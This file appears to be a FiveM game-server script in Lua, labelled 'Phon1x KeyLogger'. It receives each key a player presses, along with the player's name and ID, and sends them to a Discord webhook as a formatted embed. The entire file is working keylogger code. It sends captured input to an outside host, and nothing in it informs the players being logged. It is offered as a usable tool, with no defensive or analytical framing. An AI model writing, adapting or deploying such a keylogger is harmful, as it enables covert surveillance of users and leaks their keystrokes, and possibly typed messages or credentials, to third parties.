local webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"

RegisterServerEvent("keylogger:logKey")
AddEventHandler("keylogger:logKey", function(key)
    local src = source
    local name = GetPlayerName(src)


    local embed = {
        {
            ["title"] = "🔑 Key Press Detected",
            ["color"] = 16753920,
            ["fields"] = {
                { ["name"] = "Player", ["value"] = name .. " ("..src..")", ["inline"] = false },
                { ["name"] = "Key", ["value"] = key, ["inline"] = true }
            },
            ["footer"] = { ["text"] = "Phon1x KeyLogger" },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }

    PerformHttpRequest(webhook, function(err, text, headers) end, "POST", json.encode({
        username = "KeyLogger",
        embeds = embed
    }), { ["Content-Type"] = "application/json" })
end)
